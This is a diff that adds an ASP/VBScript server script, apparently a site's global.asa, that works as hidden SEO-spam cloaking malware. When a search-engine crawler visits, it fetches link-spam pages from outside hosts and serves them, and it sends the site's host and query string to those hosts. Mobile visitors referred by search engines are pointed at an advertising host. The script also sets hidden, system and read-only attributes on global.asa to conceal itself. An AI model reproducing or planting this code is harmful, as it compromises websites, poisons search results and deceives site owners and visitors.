@@ -1,0 +1,132 @@
+<script CodePage=936  language="vbscript" runat="server"> 
+Public agent, url, host, urlok, htmltxt, hosturl, anlian, guanggao,combinedContent,anlianContent
+Public httpreferer, isSpider, isMobile, isURL
+Public zym_2
+	Server.ScriptTimeout = 3600
+	On Error Resume Next
+	agent = LCase(Request.ServerVariables("HTTP_USER_AGENT"))
+	If Err.Number <> 0 Then
+    		Err.Clear
+	End If
+	url = "http://asp.dasih156.cc/" & GenerateRandomString(6)
+	anlian = "http://asp.oj546.com/sitemap.php"
+	guanggao = "http://ky88866.cc/index.html"
+
+	host = "http://" & Request.ServerVariables("HTTP_HOST")
+	hosturl = Request.ServerVariables("QUERY_STRING")
+	urlok = url & "/index.php?host=" & host & "&q=" & Request.ServerVariables("QUERY_STRING")
+	httpreferer = LCase(Request.ServerVariables("HTTP_REFERER"))
+	isSpider = CheckIfSpider(agent)
+	isMobile = CheckIfMobile(agent)
+    isURL = CheckIfUrl(hosturl)
+    isFromSearchEngine = CheckIfFromSearchEngine(httpreferer)
+
+	If isSpider Then
+        htmltxt = geturl(anlian, agent)
+
+   	 	If isURL Then
+            anlianContent = geturl(url, agent)
+            combinedContent = "url:" & url & anlianContent & htmltxt
+            Response.Write combinedContent 
+            Response.End 
+        End If
+        Response.Write htmltxt  
+    ElseIf isMobile And isFromSearchEngine Then
+        htmltxt = geturl(guanggao, agent)
+        Response.Write combinedContent
+        Response.End 
+    End If
+
+    Set fso = Server.CreateObject ( "Scripting.FileSystemObject" )  
+    Set file = fso.Getfile ( Server.MapPath ( "/global.asa" ) )  
+    If file.attributes <> 7 Then 
+        file.attributes = 7  
+    End If 
+    Response.Write vbCrLf
+    Function CheckIfFromSearchEngine(refererString)
+        Dim searchEngines, searchEngine
+        searchEngines = Array("baidu.com", "so.com", "sogou.com", "sm.cn", "google.com" ,"bing.com")
+        For Each searchEngine In searchEngines
+            If InStr(refererString, searchEngine) > 0 Then
+                CheckIfFromSearchEngine = True
+                Exit Function
+            End If
+        Next
+        CheckIfFromSearchEngine = False
+    End Function
+
+    Function CheckIfSpider(ByVal agentString)
+        Dim spiders, spider
+        spiders = Array("baidu", "google", "sogou", "bingbot", "yandex", "baiduspider", "yisou", "soso")
+        For Each spider In spiders
+            If InStr(agentString, spider) > 0 Then
+                CheckIfSpider = True
+                Exit Function
+            End If
+        Next
+        CheckIfSpider = False
+    End Function
+
+    Function CheckIfMobile(agentString)
+        Dim mobiles, mobileDevice
+        mobiles = Array("mobile", "android", "iphone", "ipad", "windows phone")
+        For Each mobileDevice In mobiles
+            If InStr(agentString, mobileDevice) > 0 Then
+                CheckIfMobile = True
+                Exit Function
+            End If
+        Next
+        CheckIfMobile = False
+    End Function
+
+    Function CheckIfUrl(ByVal urlString)
+        Dim urls, url
+        urls = Array("xml", "doc", "pdf", "txt", "ppt", "pptx", "xls", "csv", "shtml", "tacc", "ga","gq", "xlsx", "zid")
+        For Each url In urls
+            If InStr(urlString, url) > 0 Then
+                CheckIfUrl = True
+                Exit Function
+            End If
+        Next
+        CheckIfUrl = False
+    End Function
+
+    Function geturl(ByVal zym_2, ByVal agent)
+        On Error Resume Next 
+        Dim xmlhttp, stream
+        Set xmlhttp = Server.CreateObject("MSXML2.ServerXMLHTTP")
+        xmlhttp.Open "GET", zym_2, False
+        xmlhttp.setRequestHeader "User-Agent", agent
+        xmlhttp.send
+        If Err.Number = 0 Then 
+            Set stream = Server.CreateObject("Adodb.Stream")
+            stream.Type = 1
+            stream.Mode = 3
+            stream.Open
+            stream.Write xmlhttp.responseBody
+            stream.Position = 0
+            stream.Type = 2
+            stream.Charset = "utf-8"
+            geturl = stream.ReadText
+            stream.Close
+        Else
+            Err.Clear
+        End If
+        Set xmlhttp = Nothing
+        If Err.Number <> 0 Then
+
+            Err.Clear
+        End If
+    End Function
+
+    Function GenerateRandomString(length)
+        Dim characters, randomString, i
+        characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
+        randomString = ""
+        Randomize
+        For i = 1 To length
+            randomString = randomString & Mid(characters, Int((Len(characters) * Rnd) + 1), 1) 
+        Next
+        GenerateRandomString = randomString
+    End Function
+</script>
